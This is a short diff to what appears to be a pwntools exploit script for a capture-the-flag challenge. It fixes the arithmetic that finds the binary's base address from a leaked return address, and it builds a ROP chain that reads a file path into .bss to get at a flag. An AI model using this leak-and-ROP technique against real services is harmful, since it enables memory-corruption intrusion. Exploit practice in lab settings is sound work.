@@ -55,7 +55,9 @@ res = r.recvline()
 
 ret_addr = u64(res.split(b'B'*152)[1][:-1].ljust(8, b'\x00'))
 
-base_addr = ret_addr - 0x9C83
+main_offset = elf.symbols['main']
+base_addr = ret_addr - 0x8A - main_offset
+
 elf.address = base_addr
 
 r.recvuntil(b"What's the customer's name? ")
@@ -63,7 +65,7 @@ r.recvuntil(b"What's the customer's name? ")
 rop = ROP(elf)
 
 flag_path_addr = elf.bss() + 0x200
-read_buffer_addr = elf.bss() + 0x200 + 0x20
+read_buffer_addr = flag_path_addr + 0x20
 
 # ROP Chain
 rop.read(0, flag_path_addr, 8)
